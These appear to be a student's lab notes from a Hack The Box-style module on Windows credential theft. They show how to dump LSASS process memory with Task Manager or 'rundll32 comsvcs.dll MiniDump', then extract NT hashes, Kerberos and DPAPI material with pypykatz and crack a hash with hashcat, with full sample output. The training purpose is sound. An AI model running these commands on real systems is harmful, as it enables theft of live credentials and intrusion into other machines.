In addition to obtaining the `SAM` `database` for offline `password` `hash` extraction, targeting the `LSASS` process provides access to `credential` material stored directly in `memory`. The `LSASS` process manages `authentication` operations, applies `security policies`, and retains sensitive information such as `NTLM` `hashes`, `Kerberos` `tickets`, and, in certain `config` settings, cleartext `credentials` handled by `LSASS`. By dumping the contents of `LSASS`, it becomes possible to recover live `credentials` without relying solely on cracking `password` `hashes` from the `SAM` `database`.

![[{FCDB79B6-09C9-46E8-BC34-EF5F10A75A95}.png]]

Upon initial logon, `LSASS` will:

- Cache credentials locally in memory
- Create `access tokens`
- Enforce `security policies`
- Write to Windows' `security log`
---
## Dumping LSASS process memory

Similar to `attacking` the `SAM` `database`, it is beneficial to first create a copy of the `LSASS` process `memory` by generating a `memory` `dump`. Producing a `dump` file allows the extraction of `credentials` offline using the attack `host`. Performing `attacks` offline provides more `flexibility` in attack `speed` and reduces the time spent interacting with the target `system`. There are numerous methods to create a `memory` `dump`, so the focus here is on techniques achievable using built-in `Windows` tools.
#### Task Manager method

With `access` to an interactive graphical session on the target, we can use `task manager` to create a `memory dump`. This requires us to:

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

![[{6502236E-530A-4838-8663-9F022F9DA1D8}.png]]

A file named `lsass.DMP` is created and stored in the `%temp%` `directory`. This `lsass.DMP` `file` is the `dump` we will transfer to our `attack host`. The transfer can be completed using the same `file` transfer `method` covered in the previous section of this `module`, allowing the `dump` to be moved safely to the `attack host` for offline `analysis`.

---
#### Rundll32.exe & Comsvcs.dll method

The `Task Manager` method depends on having a `GUI`-based interactive `session` with the target `system`. An alternative approach is to dump `LSASS` process `memory` using the command-line utility `rundll32.exe`. This method is faster than the `Task Manager` technique and more flexible, especially when access to a Windows `host` is limited to a command-line `shell` `session`. It is important to note that modern `anti-virus` tools commonly detect and flag this method as `malicious activity`.

---
#### Finding LSASS's PID in cmd

We can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.

```bash
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```
#### Finding LSASS's PID in PowerShell

We can issue the command `Get-Process lsass` and see the process ID in the `Id` field.

```bash
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```
#### Creating a dump file using PowerShell

With an elevated `PowerShell session`, we can issue the following command to create a dump file:

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```

Breaking it down:

- `rundll32.exe` → the loader
- `comsvcs.dll, MiniDump` → DLL + function to execute
- `<PID>` → the `PID` of the `LSASS` process
- `C:\Temp\lsass.dmp` → output dump location
- `full` → type of memory dump

Using this command, `rundll32.exe` loads and executes an exported `function` from `comsvcs.dll`, which then calls the `MiniDumpWriteDump` (`MiniDump`) `function` to create a `memory` `dump` of the `LSASS` process. The resulting `lsass.dmp` `file` is written to the specified `directory` (`C:\lsass.dmp`). Modern `AV` and `EDR` tools typically identify this activity as malicious and block the `command`, meaning `AV` bypass techniques may be required, though such techniques fall outside the scope of this `module`.

If the `command` executes successfully and the `lsass.dmp` `file` is generated, the next step is to transfer the `dump` to the attack `host`. Once transferred, it becomes possible to extract any `credentials` that were stored within the `LSASS` process `memory`.

---
## Using Pypykatz to extract credentials

Once the `dump` `file` is on the attack `host`, we can use a powerful tool called `pypykatz` to extract `credentials` from the `.dmp` `file`. `Pypykatz` is a Python implementation of `Mimikatz`. Because it’s written entirely in `Python`, it runs on `Linux`-based attack `hosts`. In contrast, `Mimikatz` only runs on `Windows` systems, so using it requires either a `Windows` attack `host` or running it directly on the target, which is less ideal. This makes `pypykatz` an attractive alternative since all it needs is a copy of the `dump` `file`, allowing offline analysis from a `Linux` attack `host`.

Remember, `LSASS` stores `credentials` for active `logon sessions` on `Windows` systems. Dumping `LSASS` process `memory` creates a snapshot of what was in `memory` at that moment. If any active `logon sessions` existed, the `credentials` used to establish them will be present in the `dump`.
#### Running Pypykatz

The command runs `pypykatz` to parse secrets stored in the `LSASS` process `memory` `dump`. The `lsa` argument refers to `LSASS`, which is a subsystem of the `Local Security Authority`. The command specifies the data source as a `minidump` `file`, followed by the path to the `dump` `file` saved on the attack `host`. `Pypykatz` processes the `dump` and outputs any extracted `credentials` or sensitive data found within.

```bash
OathBornX@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

---
## MSV

```bash
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

`MSV` is a Windows `authentication package` that the `LSA` calls to validate logon attempts against the `SAM` `database`. `Pypykatz` extracted the `SID`, `Username`, `Domain`, and the `NT` & `SHA1` `password hashes` linked to the `bob` user account’s `logon session` stored in the `LSASS` process `memory`. This information will be useful in the next phase of the attack detailed later in this section.
## WDIGEST

```bash
== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` is an older `authentication protocol` enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`.` LSASS` caches credentials used by `WDIGEST` in clear-text.

## Kerberos

```bash
== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

`Kerberos` is a network `authentication` `protocol` used by `Active Directory` in `Windows` `Domain` environments. Upon authentication with `Active Directory`, domain user accounts receive `tickets` that grant access to shared network resources without repeatedly entering credentials. The `LSASS` process caches `passwords`, `encryption keys` (`ekeys`), `tickets`, and `PINs` related to `Kerberos`. These can be extracted from `LSASS` `process` `memory` and leveraged to access other systems within the same `domain`.
## DPAPI

```bash
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

`Mimikatz` and `Pypykatz` can extract the `DPAPI` `masterkey` for logged-on users whose data resides in `LSASS` process `memory`. These `masterkeys` enable `decryption of secrets` tied to applications using `DPAPI`, allowing capture of credentials for various accounts. Detailed `DPAPI` attack techniques are covered in the Windows `Privilege Escalation` module.
#### Cracking the NT Hash with Hashcat

We can use `Hashcat` to crack the` NT Hash`. In this example, we only found one `NT hash` associated with the Bob user. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

```bash
OathBornX@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

